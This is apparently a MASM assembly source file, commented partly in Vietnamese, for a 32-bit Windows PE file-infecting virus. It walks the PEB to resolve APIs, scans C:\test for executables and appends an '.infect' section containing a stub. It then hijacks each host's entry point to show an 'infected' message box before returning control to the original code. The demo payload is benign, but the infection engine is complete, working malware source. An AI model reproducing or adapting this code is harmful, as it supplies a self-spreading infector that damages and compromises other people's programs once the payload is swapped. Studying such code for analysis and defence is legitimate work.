; ==============================================================================
; Compile & Link command:
;   ml /c /Zd /coff fileInfect_Success.asm
;       (ml /c /Zd /coff /Fl fileInfect_Success.asm (include file .lst for debug))
;           link fileInfect_Success.obj /subsystem:console /entry:start
; Run:              fileInfect_Success.exe
; ==============================================================================


; ==============================================================================
; ====== Flow code ======
; Bắt đầu từ `start`, virus nạp động các API cần thiết 
; phân tích PEB và Export Table của `kernel32.dll`

; Sau đó, nó tạo một Mutex để tránh chạy nhiều lần
; Nó bắt đầu `infection_loop`, quét thư mục `C:\test`
; lọc ra các file PE 32-bit chưa bị nhiễm và không phải là chính nó.
; Với mỗi nạn nhân, nó gọi `InfectFile`, đọc file vào buffer
; gọi `AddInfectionSection` để thêm một section `.infect` mới
; ghi đè `AddressOfEntryPoint` của file trỏ đến section '.infect'
; Sau đó, nó chép `virus_stub` vào section mới, patch các địa chỉ API cần thiết và OEP của host vào stub.

; Khi file bị nhiễm được chạy, `virus_stub` thực thi trước
; Nó dùng kỹ thuật delta offset để lấy EIP, hiển thị `MessageBox`
; sau đó nhảy về OEP, cho phép chương trình gốc tiếp tục chạy bình thường

; ==============================================================================

.386
.MODEL flat, stdcall
OPTION CASEMAP:NONE
INCLUDE windows.inc
INCLUDE kernel32.inc
INCLUDELIB kernel32.lib

.data
    ; === SYSTEM STRINGS ===
    mutex_name      db "PEInfectorMutex",0
    search_path     db "C:\test\*.*",0
    base_path       db "C:\test\",0
    dot_str          db ".", 0
    dotdot_str       db "..", 0
    sys_str       db "sys", 0
    
    ; === INFECTION MARKER ===
    infected_section db ".infect",0

    ; === API STRINGS ===
    CreateFileA_str         db "CreateFileA",0
    ReadFile_str            db "ReadFile",0
    WriteFile_str           db "WriteFile",0
    CloseHandle_str         db "CloseHandle",0
    GetFileSize_str         db "GetFileSize",0
    VirtualAlloc_str        db "VirtualAlloc",0
    VirtualFree_str         db "VirtualFree",0
    FindFirstFileA_str      db "FindFirstFileA",0
    FindNextFileA_str       db "FindNextFileA",0
    GetModuleFileNameA_str  db "GetModuleFileNameA",0
    GetProcAddress_str      db "GetProcAddress",0
    LoadLibraryA_str        db "LoadLibraryA",0
    CreateMutexA_str        db "CreateMutexA",0
    GetLastError_str        db "GetLastError",0
    ExitProcess_str         db "ExitProcess",0
    SetFilePointer_str      db "SetFilePointer",0
    lstrcpyA_str            db "lstrcpyA",0
    lstrcatA_str            db "lstrcatA",0
    lstrcmpiA_str           db "lstrcmpiA",0

.data?
    ; === API POINTERS ===
    hKernel32               dd ?
    pGetProcAddress         dd ?
    pLoadLibraryA           dd ?
    pCreateFileA            dd ?
    pReadFile               dd ?
    pWriteFile              dd ?
    pCloseHandle            dd ?
    pGetFileSize            dd ?
    pVirtualAlloc           dd ?
    pVirtualFree            dd ?
    pFindFirstFileA         dd ?
    pFindNextFileA          dd ?
    pGetModuleFileNameA     dd ?
    pCreateMutexA           dd ?
    pGetLastError           dd ?
    pExitProcess            dd ?
    pSetFilePointer         dd ?
    plstrcpyA               dd ?
    plstrcatA               dd ?
    plstrcmpiA              dd ?
    
    ; === WORKING VARIABLES ===
    find_data               WIN32_FIND_DATA <?>
    self_path               db MAX_PATH dup(?) ; Path of virus
    target_path             db MAX_PATH dup(?) ; Path of dest file
    search_handle           dd ?
    file_handle             dd ?
    
    ; === TEMP STORAGE FOR INFECTION ===
    original_entry_point_val dd ?
    image_base_val          dd ?
    section_align           dd ?
    file_align              dd ?

.code

; =============================================
; VIRUS STUB - Run when infected file is executed
; =============================================
virus_stub PROC
    call delta_offset
delta_offset:
    pop ebp
    ; Trừ đi khoảng cách tương đối của "delta_offset" so với đầu của "virus_stub".
    ; EBP = virus_stub head (base address)
    sub ebp, (offset delta_offset - offset virus_stub)
    ; ====================================================
        
    ; Load user32.dll, MessageBoxA
    lea eax, [ebp + (offset stub_user32_dll - offset virus_stub)]   ;VA of "user32.dll" in virus_stub
    push eax
    call DWORD PTR [ebp + (offset pLoadLibraryA_stub - offset virus_stub)]     
    ;patch in InfectFile, call LoadLibraryA real
    test eax, eax
    jz @@restore_and_jump
    
    mov ebx, eax        ; ebx = user32.dll handle
    
    lea eax, [ebp + (offset stub_msgbox_api - offset virus_stub)]
    push eax
    push ebx 
    call DWORD PTR [ebp + (offset pGetProcAddress_stub - offset virus_stub)]
    test eax, eax
    jz @@restore_and_jump
    
    ; MessageBox
    push MB_OK or MB_ICONINFORMATION
    lea ecx, [ebp + (offset stub_caption_text - offset virus_stub)]
    push ecx
    lea ecx, [ebp + (offset stub_message_text - offset virus_stub)]
    push ecx
    push 0
    call eax
    
@@restore_and_jump:
    ; ===Find OEP of host program===
    ; ebp = base addr of stub
    ;    ecx = ImageBase_random (running) = ebp - RVA_của_stub (0xA00000)
    mov ecx, ebp
    sub ecx, [ebp + (offset rva_stub - offset virus_stub)]    
    ; Tính địa chỉ OEP tuyệt đối
    ;    eax = RVA of OEP = ImageBase_random + OEP_saved   (0x1235)
    mov eax, [ebp + (offset original_entry_point_stub - offset virus_stub)]
    
    add eax, ecx    
    jmp eax         ; OEP of host program (ex: 0xA01235)

; Data virus stub 
    stub_user32_dll       db "user32.dll",0
    stub_msgbox_api       db "MessageBoxA",0
    stub_caption_text     db "PE Infector",0
    stub_message_text     db "This file has been infected!",0

; inject when infected
    pLoadLibraryA_stub      dd 0
    pGetProcAddress_stub    dd 0
    original_entry_point_stub dd 0
    rva_stub         dd 0

virus_stub ENDP
;virus_stub change, virus_stub_size will auto update when compile again
virus_stub_size = $ - virus_stub

; =============================================
; HÀM LẤY KERNEL32 BASE - PEB
; =============================================
GetKernel32Base PROC
    ; === GET KERNEL32 BASE ADDRESS ===
    ASSUME FS:NOTHING
    Mov Eax, FS:[30h]               ; PEB
    Mov Eax, DWORD PTR [Eax + 0Ch]  ; PEB_LDR_DATA
    Mov Eax, DWORD PTR [Eax + 14h]  ; InMemoryOrderModuleList (Flink)
    Mov Eax, DWORD PTR [Eax]        ; Entry thứ 2 (ntdll.dll)
    Mov Eax, DWORD PTR [Eax]        ; Entry thứ 3 (kernel32.dll)
    Mov Eax, DWORD PTR [Eax + 10h]  ; Base address của kernel32.dll
    Mov [hKernel32], Eax
    ;Mov Ebx, Eax
    ret
GetKernel32Base ENDP

; =============================================
; HÀM TÌM GETPROCADDRESS
; =============================================
FindGetProcAddress PROC
    mov ebx, [hKernel32]    ; ImageBase
    mov eax, [ebx + 3Ch]    ; e_lfanew (MZ)
    add ebx, eax            ; PE Header
    mov eax, [ebx + 78h]    ; Export Table RVA
    mov edi, [hKernel32]
    add edi, eax            ; Export Table VA
    
    mov ecx, [edi + 18h]    ; NumberOfNames
    mov edx, [edi + 20h]    ; AddressOfNames RVA
    add edx, [hKernel32]    ; AddressOfNames VA
    
@@find_loop:
    dec ecx
    mov esi, [edx + ecx*4]  ; RVA of func name string
    add esi, [hKernel32]    ; VA of name string
    
    cmp dword ptr [esi], 'PteG'
    jne @@find_loop
    cmp dword ptr [esi+4], 'Acor'
    jne @@find_loop
    cmp dword ptr [esi+8], 'erdd'
    jne @@find_loop
    
    mov edx, [edi + 24h]    ; AddressOfNameOrdinals RVA
    add edx, [hKernel32]    ; AddressOfNameOrdinals VA
    movzx ecx, word ptr [edx + ecx*2] ; ecx = ordinal GPA
    
    mov edx, [edi + 1Ch]    ; AddressOfFunctions RVA
    add edx, [hKernel32]    ; AddressOfFunctions VA
    mov eax, [edx + ecx*4]  ; eax = RVA GPA
    add eax, [hKernel32]    ; VA
    mov [pGetProcAddress], eax
    ret
FindGetProcAddress ENDP

; =============================================
; LOAD API
; =============================================
LoadAPI PROC USES ebx, api_name_ptr:DWORD
    push api_name_ptr
    push [hKernel32]
    call [pGetProcAddress]
    ret
LoadAPI ENDP

; =============================================
; CHECK SECTION ".infect"
; =============================================
CheckInfected PROC file_buffer:DWORD
    mov esi, file_buffer
    mov eax, [esi + 3Ch]
    add esi, eax ; PE Header
    
    movzx ecx, word ptr [esi + 6] ; NumberOfSections
    jz @@not_infected
    
    movzx edx, word ptr [esi + 14h] ; SizeOfOptionalHeader
    lea edi, [esi + 18h + edx]      ; First section header
    
@@check_loop:
    push edi  ; save edi, esi, ecx 
    push esi    
    push ecx

    mov esi, offset infected_section ; ESI trỏ đến chuỗi marker ".infect"
    mov ecx, 8                       ; Thiết lập bộ đếm cho `repe cmpsb`
    repe cmpsb                       ; so sánh
    
    pop ecx
    pop esi   ; recover ESI
    pop edi   ; recover EDI để không làm hỏng vòng lặp
    
    je @@is_infected          
    jne @@next_section


@@next_section:
    add edi, 28h ; Size of IMAGE_SECTION_HEADER
    dec ecx
    jnz @@check_loop

@@not_infected:
    xor eax, eax 
    ret

@@is_infected:
    mov eax, 1 
    ret
CheckInfected ENDP

; =============================================
; ADD SECTION ".infect"
; =============================================
AddInfectionSection PROC USES esi edi ebx ecx edx, file_buffer:DWORD
    mov esi, file_buffer
    mov eax, [esi + 3Ch]
    add esi, eax
    mov ebx, esi ; ebx = PE Header
    
    ; Get PE info
    mov eax, [ebx + 28h] ; AddressOfEntryPoint
    mov [original_entry_point_val], eax
    mov eax, [ebx + 34h] ; ImageBase
    mov [image_base_val], eax
    mov eax, [ebx + 38h] ; SectionAlignment
    mov [section_align], eax
    mov eax, [ebx + 3Ch] ; FileAlignment
    mov [file_align], eax
    
    movzx ecx, word ptr [ebx + 6] ; NumberOfSections
    movzx edx, word ptr [ebx + 14h] ; SizeOfOptionalHeader
    lea edi, [ebx + 18h + edx]      ; First section header
    
    ; To last section header 
    dec ecx                 ; ecx = NumberOfSections - 1
    mov eax, 28h            ; Size of 1 section header
    imul eax, ecx           ; eax = (NumberOfSections - 1) * 28h
    add edi, eax            ; edi point to last section header 
    mov ecx, [ebx+6]        ; recover NumberOfSections vào ecx
    
    ; Tính VirtualAddress cho section mới
    mov eax, [edi + 0Ch]    ; VirtualAddress
    add eax, [edi + 8]      ; + VirtualSize
    mov edx, [section_align] 
    add eax, edx
    dec edx
    not edx
    and eax, edx            ; eax là bội số của section_align (1000)
    mov edx, eax            ; edx = New VirtualAddress (RVA)
    ; patch vào stub, counter ASLR (random base address)
    mov [image_base_val], edx ;  image_base_val = RVA của section mới
    
    ; Tính PointerToRawData cho section mới
    mov eax, [edi + 14h]    ; PointerToRawData
    add eax, [edi + 10h]    ; + SizeOfRawData
    mov ecx, [file_align]
    add eax, ecx
    dec ecx
    not ecx
    and eax, ecx            ; eax là bội của file_align (200)
    
    ; edi trỏ đến vị trí section header mới
    add edi, 28h
    
    ; Ghi thông tin section mới
    ; replace `mov dword` to `rep movsb`
    push edi                     ; Lưu con trỏ đến header section mới
    mov esi, offset infected_section ; ESI point to ".infect"
    mov ecx, 8                   
    rep movsb                    ; copy 8 byte ".infect" to Name
    pop edi                      ; recover pointer
    
    ; VirtualSize
    mov dword ptr [edi + 8], virus_stub_size
    
    ; VirtualAddress
    mov [edi + 0Ch], edx
    
    ; SizeOfRawData
    mov ecx, virus_stub_size
    add ecx, [file_align]
    mov edx, [file_align]
    dec edx
    not edx
    and ecx, edx
    mov [edi + 10h], ecx
    
    ; PointerToRawData
    mov [edi + 14h], eax
    
    ; Characteristics = Executable, Readable, Writable, Contains Code
    mov dword ptr [edi + 24h], 0E0000020h
    
    ; Update Optional Header
    ; +1 NumberOfSections
    inc word ptr [ebx + 6]
    
    ; SizeOfImage
    mov ecx, [edi + 0Ch] ; VirtualAddress section mới
    add ecx, [edi + 8]   ; + VirtualSize
    mov edx, [section_align]
    add ecx, edx
    dec edx
    not edx
    and ecx, edx            ; Round up to section_align
    mov [ebx + 50h], ecx     ;Save to SizeOfImage
    
    ; EntryPoint
    mov edx, [edi + 0Ch]    ; VirtualAddress of .infect
    mov [ebx + 28h], edx
    
    ; return eax = offset file of .infect 
    mov eax, [edi + 14h]
    ret
AddInfectionSection ENDP

; =============================================
; HÀM LÂY NHIỄM FILE
; =============================================
InfectFile PROC USES ebx esi edi, filename:DWORD
    ;BIẾN CỤC BỘ: new_file_size để lưu kích thước file sau khi lây nhiễm
    LOCAL file_size:DWORD, buffer:DWORD, bytes_rw:DWORD, new_file_size:DWORD, alloc_size:DWORD
    
    invoke CreateFileA, filename, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    .IF eax == INVALID_HANDLE_VALUE
        jmp @@exit_fail
    .ENDIF
    mov file_handle, eax
    
    invoke GetFileSize, file_handle, NULL
    .IF eax == INVALID_FILE_SIZE
        jmp @@close_and_fail
    .ENDIF
    mov file_size, eax
    
    mov eax, file_size          ; original file size
    add eax, virus_stub_size    ; + size of virus stub
    add eax, 1000h              ; + khoang đệm an toàn (VA)
    mov alloc_size, eax         ; alloc_size

    ;allocation buffer
    invoke VirtualAlloc, NULL, alloc_size, MEM_COMMIT, PAGE_READWRITE
    .IF eax == NULL
        jmp @@close_and_fail  
    .ENDIF
    mov buffer, eax
    
    ;read file to buffer
    invoke ReadFile, file_handle, buffer, file_size, ADDR bytes_rw, NULL
    .IF eax == 0
        jmp @@free_and_fail
    .ENDIF
    
    mov esi, buffer
    .IF word ptr [esi] != 'ZM'
        jmp @@free_and_fail
    .ENDIF
    mov edi, [esi + 3Ch]
    add edi, esi
    .IF dword ptr [edi] != 00004550h
        jmp @@free_and_fail
    .ENDIF
    .IF word ptr [edi + 4] != IMAGE_FILE_MACHINE_I386       ; 14Ch 32bit
        jmp @@free_and_fail
    .ENDIF
    
    invoke CheckInfected, buffer
    .IF eax != 0
        jmp @@free_and_fail
    .ENDIF

    invoke AddInfectionSection, buffer
    mov ebx, eax ; ebx = PointerToRawData (offset) of .infect (virus here)

    ; virus size sau khi đã được căn chỉnh (align) theo FileAlignment của victim
    mov ecx, virus_stub_size    ; Bắt đầu với kích thước gốc của mã độc
    add ecx, [file_align]       ; + giá trị căn chỉnh
    dec ecx                     ; - 1 để chuẩn bị cho phép AND
    mov edx, [file_align]       ; Lấy lại giá trị căn chỉnh
    dec edx                     
    not edx                     ; Đảo bit để tạo mặt nạ (mask)
    and ecx, edx                ; ecx = kích thước section sau căn chỉnh

    ; Kích thước file mới = (offset của section mới) + (kích thước đã căn chỉnh của section mới)
    mov eax, ebx
    add eax, ecx
    mov new_file_size, eax

    lea esi, virus_stub
    mov edi, buffer
    add edi, ebx        ; edi point to offset .infect trong buffer
    mov ecx, virus_stub_size
    rep movsb

    ; Sau khi `rep movsb`, EDI đang trỏ đến CUỐI của mã độc đã sao chép
    ; đặt lại EDI về ĐẦU của mã độc trong buffer để patch đúng vị trí
    mov edi, buffer
    add edi, ebx        ; ebx = offset của section .infect
    
    ; Patch các địa chỉ API và Entry Point gốc vào bản sao của virus_stub trong buffer
    mov eax, [pLoadLibraryA]
    mov [edi + (offset pLoadLibraryA_stub - offset virus_stub)], eax
    mov eax, [pGetProcAddress]
    mov [edi + (offset pGetProcAddress_stub - offset virus_stub)], eax
    mov eax, [original_entry_point_val]
    ;Ghi OEP này vào offset cách đầu virus_stub 0x9F bytes
    mov [edi + (offset original_entry_point_stub - offset virus_stub)], eax
    ; Patch RVA của section mới vào stub để chống lại ASLR (random base address)
    mov eax, [image_base_val]       ; Lấy RVA đã được lưu từ AddInfectionSection
    mov [edi + (offset rva_stub - offset virus_stub)], eax

    ;set file pointer to begin
    invoke SetFilePointer, file_handle, 0, NULL, FILE_BEGIN

    ;write infected buffer to file
    invoke WriteFile, file_handle, buffer, new_file_size, ADDR bytes_rw, NULL
    
    mov eax, 1          ; 1 to success
    jmp @@close_then_free

@@free_and_fail:
    xor eax, eax        ; 0 to fail

@@close_then_free: 
    invoke CloseHandle, file_handle             ; (1) ĐÓNG HANDLE TRƯỚC
    invoke VirtualFree, buffer, 0, MEM_RELEASE  ; (2) FREE BUFFER SAU
    jmp @@exit_fail                             

@@close_and_fail:
    invoke CloseHandle, file_handle
@@exit_fail:
    ret
InfectFile ENDP

; =============================================
; check system file
; =============================================
IsSystemFile PROC filename:DWORD
    push edi
    mov edi, filename
    
    ; Thiết lập ECX thành -1 (giá trị tối đa) để quét toàn bộ chuỗi
    mov ecx, -1 

    ; Tìm cuối chuỗi
    xor al, al
    repne scasb
    dec edi 
    
    ; Tìm ngược lại dấu '.'
@@search_back:
    dec edi
    cmp edi, filename
    jbe @@not_sys
    cmp byte ptr [edi], '.'
    jne @@search_back
    
    ; cmp 'sys'
    inc edi
    invoke lstrcmpiA, edi, ADDR sys_str
    .IF eax == 0
        jmp @@is_sys
    .ENDIF
    
@@not_sys:
    xor eax, eax
    jmp @@done
    
@@is_sys:
    mov eax, 1
    
@@done:
    pop edi
    ret
IsSystemFile ENDP

; =============================================
; VÒNG LẶP LÂY NHIỄM
; =============================================
infection_loop PROC search_to_path:DWORD
    invoke FindFirstFileA, search_to_path, ADDR find_data
    .IF eax == INVALID_HANDLE_VALUE
        ret
    .ENDIF
    mov search_handle, eax
    
@@file_loop:
    ; FindFirstFileA: với *.*. Nó trả về cả "C:\test\." và "C:\test\.."
    ; So sánh tên file tìm được với "." và '..' 
    invoke lstrcmpiA, ADDR find_data.cFileName, ADDR dot_str
    .IF eax == 0
        jmp @@next_file         ; next if '.'
    .ENDIF
    
    invoke lstrcmpiA, ADDR find_data.cFileName, ADDR dotdot_str
    .IF eax == 0
        jmp @@next_file 
    .ENDIF

    ;next if directory
    test find_data.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
    jnz @@next_file
    
    invoke IsSystemFile, ADDR find_data.cFileName
    test eax, eax
    jnz @@next_file
    
    invoke lstrcpyA, ADDR target_path, ADDR base_path  ;C:\test\victim.exe
    invoke lstrcatA, ADDR target_path, ADDR find_data.cFileName
    
    invoke lstrcmpiA, ADDR self_path, ADDR target_path    ;check self virus
    .IF eax == 0
        jmp @@next_file
    .ENDIF
    
    invoke InfectFile, ADDR target_path
    
@@next_file:
    invoke FindNextFileA, search_handle, ADDR find_data
    .IF eax != 0
        jmp @@file_loop
    .ENDIF
    
    invoke CloseHandle, search_handle
    ret
infection_loop ENDP

; =============================================
; ENTRY POINT 
; =============================================

start:
    call GetKernel32Base
    call FindGetProcAddress
    .IF [pGetProcAddress] == 0
        jmp @@exit
    .ENDIF
    
    invoke LoadAPI, ADDR CreateFileA_str     ;push + call
    mov pCreateFileA, eax
    invoke LoadAPI, ADDR ReadFile_str
    mov pReadFile, eax
    invoke LoadAPI, ADDR WriteFile_str
    mov pWriteFile, eax
    invoke LoadAPI, ADDR CloseHandle_str
    mov pCloseHandle, eax
    invoke LoadAPI, ADDR GetFileSize_str
    mov pGetFileSize, eax
    invoke LoadAPI, ADDR VirtualAlloc_str
    mov pVirtualAlloc, eax
    invoke LoadAPI, ADDR VirtualFree_str
    mov pVirtualFree, eax
    invoke LoadAPI, ADDR FindFirstFileA_str
    mov pFindFirstFileA, eax
    invoke LoadAPI, ADDR FindNextFileA_str
    mov pFindNextFileA, eax
    invoke LoadAPI, ADDR GetModuleFileNameA_str
    mov pGetModuleFileNameA, eax
    invoke LoadAPI, ADDR CreateMutexA_str
    mov pCreateMutexA, eax
    invoke LoadAPI, ADDR GetLastError_str
    mov pGetLastError, eax
    invoke LoadAPI, ADDR ExitProcess_str
    mov pExitProcess, eax
    invoke LoadAPI, ADDR SetFilePointer_str
    mov pSetFilePointer, eax
    invoke LoadAPI, ADDR LoadLibraryA_str
    mov pLoadLibraryA, eax
    invoke LoadAPI, ADDR lstrcpyA_str
    mov plstrcpyA, eax
    invoke LoadAPI, ADDR lstrcatA_str
    mov plstrcatA, eax
    invoke LoadAPI, ADDR lstrcmpiA_str
    mov plstrcmpiA, eax

    ;prevent multiple instance
    invoke CreateMutexA, NULL, FALSE, ADDR mutex_name
    invoke GetLastError
    .IF eax == ERROR_ALREADY_EXISTS
        jmp @@exit
    .ENDIF
    
    ;self_path = C:\...\fileInfect_Success.exe 
    invoke GetModuleFileNameA, NULL, ADDR self_path, MAX_PATH
    
    ; call infection_loop with search_path *.*
    invoke infection_loop, ADDR search_path
    
@@exit:
    invoke ExitProcess, 0
end start